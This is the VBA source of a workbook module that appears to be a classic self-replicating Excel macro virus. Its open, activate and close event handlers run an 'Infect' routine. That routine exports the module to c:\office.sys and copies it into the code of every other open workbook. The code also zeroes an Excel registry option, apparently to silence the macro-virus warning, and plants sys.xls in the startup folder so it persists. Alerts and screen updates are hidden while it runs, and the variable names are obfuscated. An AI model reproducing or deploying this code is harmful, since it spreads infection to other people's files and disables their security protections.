   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Option Compare Text 'FRIEND
   Private Declare Function RegOpenKeyExA Lib "advapi32.dll" _
   (ByVal hKey As Long, ByVal lpSubKey As _
   String, ByVal ulOptions As Long, ByVal samDesired As _
   Long, phkResult As Long) As Long
   Private Declare Function RegSetValueExA Lib "advapi32.dll" _
   (ByVal hKey As Long, ByVal lpValueName As _
   String, ByVal Reserved As Long, ByVal dwType As Long, _
   lpData As Any, ByVal cbData As Long) As Long
   Private Declare Function RegCloseKey Lib "advapi32.dll" _
   (ByVal hKey As Long) As Long
   Const HKEY_CURRENT_USER = &H80000001
   Const KEY_ALL_ACCESS = &H3F
   Const lngData As Long = 0
   Const REG_DWORD As Long = 4
   Private Sub Workbook_Activate()
   Infect
   End Sub
   Function Infect()
   On Error GoTo xnctsg
   Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
   For Each yactgf In VBProject.VBE.VBProjects
   xcctsg = yactgf.VBComponents.Count
   For Each xcctxg In yactgf.VBComponents
   yactxg = xcctxg.Name
   If yactxg = "ThisWorkbook" Then
   If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
   yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
   With yactgf.VBComponents(yactxg).CodeModule
   For asjjh = 1 To 4
   .DeleteLines 1
   Next asjjh
   End With
   End If
   End If
   Next xcctxg
   5 Next yactgf
   Exit Function
   xnctsg:
   If Err.Number = 50289 Then
   Err.Clear
   Resume 5
   End If
   End Function
   Private Sub Workbook_Open()
   u = RegOpenKeyExA(HKEY_CURRENT_USER, _
   "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
   KEY_ALL_ACCESS, k)
   u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
   u = RegCloseKey(k)
   Application.DisplayAlerts = False
   Application.ScreenUpdating = False
   For Each wbxxc In Workbooks
   If wbxxc.Name = "sys.xls" And ThisWorkbook.Name <> "sys.xls" Then
   Application.DisplayAlerts = True
   Application.ScreenUpdating = True
   Exit Sub
   End If
   If wbxxc.Name = "sys.xls" And ThisWorkbook.Name = "sys.xls" Then GoTo 99
   Next wbxxc
   Application.Workbooks.Add
   ActiveWorkbook.SaveAs (Application.StartupPath & "\sys.xls")
   ActiveWindow.Visible = True
   99 On Error GoTo xnctsg
   If ThisWorkbook.Name = "sys.xls" Then
   Application.Workbooks.Add
   End If
   Application.ThisWorkbook.VBProject.VBComponents("ThisWorkbook").Export "c:\office.sys"
   For Each yactgf In VBProject.VBE.VBProjects
   xcctsg = yactgf.VBComponents.Count
   For Each xcctxg In yactgf.VBComponents
   yactxg = xcctxg.Name
   If yactxg = "ThisWorkbook" Then
   If yactgf.VBComponents(yactxg).CodeModule.CountOfLines <= 1 Then
   yactgf.VBComponents(yactxg).CodeModule.AddFromFile "c:\office.sys"
   With yactgf.VBComponents(yactxg).CodeModule
   For asjjh = 1 To 4
   .DeleteLines 1
   Next asjjh
   End With
   End If
   End If
   Next xcctxg
   5 Next yactgf
   Application.Workbooks("sys.xls").Close savechanges:=True
   Application.DisplayAlerts = True
   Application.ScreenUpdating = True
   Exit Sub
   xnctsg:
   If Err.Number = 50289 Then
   Err.Clear
   Resume 5
   End If
   End Sub
   Private Sub Workbook_BeforeClose(Cancel As Boolean)
   u = RegOpenKeyExA(HKEY_CURRENT_USER, _
   "Software\Microsoft\Office\8.0\Excel\Microsoft Excel", 0&, _
   KEY_ALL_ACCESS, k)
   u = RegSetValueExA(k, "Options6", 0&, REG_DWORD, lngData, 4)
   u = RegCloseKey(k)
   If ThisWorkbook.Name = "sys.xls" Then Exit Sub
   Infect
   End Sub
